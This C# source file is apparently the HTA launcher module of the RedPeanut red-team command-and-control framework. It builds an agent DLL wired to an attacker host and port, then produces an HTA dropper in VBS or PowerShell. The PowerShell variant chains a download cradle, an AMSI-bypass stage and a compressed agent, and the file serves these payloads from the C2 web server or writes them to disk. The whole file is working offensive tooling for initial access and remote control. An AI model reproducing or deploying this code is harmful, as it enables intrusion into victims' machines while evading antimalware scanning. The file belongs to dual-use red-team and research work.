//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using static RedPeanut.Utility;
using System.IO;

namespace RedPeanut
{
    public class LauncherHtaManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set filename", "Set Domain" },
            { "set hosted", "If true add the generated hta to the resources served by webserver" },
            { "set lhost", "Set lhost" },
            { "set lport", "Set lport" },
            { "set profile", "Set profile" },
            { "set lang", "Set scripting language (powershell,vbs)" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        IAgentInstance agent = null;
        string modulename = "hta";
        string filename = null;
        string lhost = null;
        int lport = 0;
        int profile = 0;
        string lang = "powershell";
        bool hosted = false;

        bool exit = false;

        public LauncherHtaManager()
        {

        }

        public LauncherHtaManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                LauncherMenu(input);
            } while (!exit);
        }

        private void LauncherMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set filename":
                            filename = GetParsedSetString(input);
                            break;
                        case "set hosted":
                            hosted = GetParsedSetBool(input);
                            break;
                        case "set lhost":
                            lhost = GetParsedSetString(input);
                            break;
                        case "set lport":
                            lport = GetParsedSetInt(input);
                            break;
                        case "set profile":
                            profile = GetParsedSetInt(input);
                            break;
                        case "set lang":
                            lang = GetParsedSetString(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }


        private void Run()
        {
            List<string> args = new List<string>();

            try
            {
                if (string.IsNullOrEmpty(filename) || string.IsNullOrEmpty(lhost) || lport < 1 || profile < 1)
                {
                    return;
                }
                else
                {
                    if (lang == "vbs")
                    {
                        string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                        if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profile))
                        {
                            //Building agent
                            ListenerConfig conf = new ListenerConfig("", lhost, lport, Program.GetC2Manager().GetC2Server().GetProfile(profile), profile);
                            string source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));
                            source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), 35, conf);
                            string outfilename = RandomAString(10, new Random()) + ".dll";
                            Builder.GenerateDll(source, outfilename, 35);

                            //Add resource to webserver
                            C2Manager c2manager = Program.GetC2Manager();
                            c2manager.GetC2Server().RegisterWebResource(outfilename, new WebResourceInstance(null, outfilename));

                            string uricontent = Program.GetC2Manager().GetC2Server().GetProfile(profile).ContentUri.TrimStart('/');
                            if (!uricontent.EndsWith("/"))
                                uricontent += "/";

                            string resourcepath = uricontent + outfilename;

                            //Build shooter assembly
                            source = File.ReadAllText(Path.Combine(folderrpath, SHOOTER_TEMPLATE));
                            source = Replacer.ReplaceAgentShooter(source, resourcepath, conf);

                            string assemblyBase64 = Builder.GenerateDllBase64(source, RandomAString(10, new Random()) + ".dll", 35);

                            HtaVBSGenerator gen = new HtaVBSGenerator(assemblyBase64, null);

                            if (hosted)
                            {
                                //Add resource to webserver storage
                                c2manager.GetC2Server().RegisterWebResource(filename, new WebResourceInstance(gen, filename));
                                Console.WriteLine("[*] Resource added to webserver resources");
                                Console.WriteLine("[*] Starting point at https://{0}:{1}/{2}", lhost, lport, uricontent + filename);
                                return;
                            }
                            else
                            {
                                //Write file to tmp env dir
                                File.WriteAllText(Path.Combine(Path.GetTempPath(), filename), gen.GetScriptText());
                                Console.WriteLine("[*] {0} Created", Path.Combine(Path.GetTempPath(), filename));
                            }
                        }
                    }
                    else
                    {
                        if (lang == "powershell")
                        {
                            string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                            if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profile))
                            {
                                string psfilename = RandomString(10, new Random()) + ".ps1";
                                ListenerConfig conf = new ListenerConfig("", lhost, lport, Program.GetC2Manager().GetC2Server().GetProfile(profile), profile);
                                string source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));
                                source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), 40, conf);

                                string assemblyBase64 = Builder.GenerateDllBase64(source, RandomString(10,new Random()) + ".dll");

                                Dictionary<string, string> arg = new Dictionary<string, string>();
                                arg.Add("#{lhost}", lhost);
                                arg.Add("#{lport}", lport.ToString());

                                string uricontent = Program.GetC2Manager().GetC2Server().GetProfile(profile).ContentUri;

                                uricontent = uricontent.TrimStart('/');

                                if (!uricontent.EndsWith("/"))
                                    uricontent += "/";

                                arg.Add("#{uri}", uricontent + "s2_" + psfilename);

                                byte[] assemblybytte = Convert.FromBase64String(assemblyBase64);
                                string agentCompBase64 = Convert.ToBase64String(CompressAssembly(assemblybytte));

                                Dictionary<string, string> argagent = new Dictionary<string, string>();
                                argagent.Add("#{bytelen}", assemblybytte.Length.ToString());

                                PowershellCradleGenerator gen_s0 = new PowershellCradleGenerator(agentCompBase64, arg);
                                PowershellAmsiGenerator gen_s1 = new PowershellAmsiGenerator(agentCompBase64, arg);
                                PowershellAgentGenerator gen_s2 = new PowershellAgentGenerator(agentCompBase64, argagent);

                                HtaPowerShellGenerator gen = new HtaPowerShellGenerator(gen_s0.GetScriptText(), null);

                                if (hosted)
                                {
                                    //Add resource to webserver storage
                                    C2Manager c2manager = Program.GetC2Manager();

                                    c2manager.GetC2Server().RegisterWebResource(filename, new WebResourceInstance(gen, filename));
                                    c2manager.GetC2Server().RegisterWebResource(psfilename, new WebResourceInstance(gen_s1, psfilename));
                                    c2manager.GetC2Server().RegisterWebResource("s2_" + psfilename, new WebResourceInstance(gen_s2, "s2_" + psfilename));
                                    Console.WriteLine("[*] Resource added to webserver resources");
                                    Console.WriteLine("[*] Starting point at https://{0}:{1}/{2}", lhost, lport, uricontent + filename);
                                    return;
                                }
                                else
                                {
                                    //Write file to tmp env dir
                                    File.WriteAllText(Path.Combine(Path.GetTempPath(), filename), gen.GetScriptText());
                                    File.WriteAllText(Path.Combine(Path.GetTempPath(), psfilename), gen_s1.GetScriptText());
                                    File.WriteAllText(Path.Combine(Path.GetTempPath(), "s2_" + psfilename), gen_s2.GetScriptText());

                                    Console.WriteLine("[*] {0} Created", Path.Combine(Path.GetTempPath(), filename));
                                    Console.WriteLine("[*] {0} Created", Path.Combine(Path.GetTempPath(), psfilename));
                                    Console.WriteLine("[*] {0} Created", Path.Combine(Path.GetTempPath(), "s2_" + psfilename));
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("[*] Language not supported {0} (powershell,vbs)", lang);
                            return;
                        }
                    }
                }
            }catch(Exception e)
            {
                Console.WriteLine("[*] Error running task build {0}", e.Message);
                return;
            }
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "filename", filename },
                { "lhost", lhost },
                { "lport", lport.ToString() },
                { "profile", profile.ToString() },
                { "hosted", hosted.ToString() },
                { "lang", lang }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
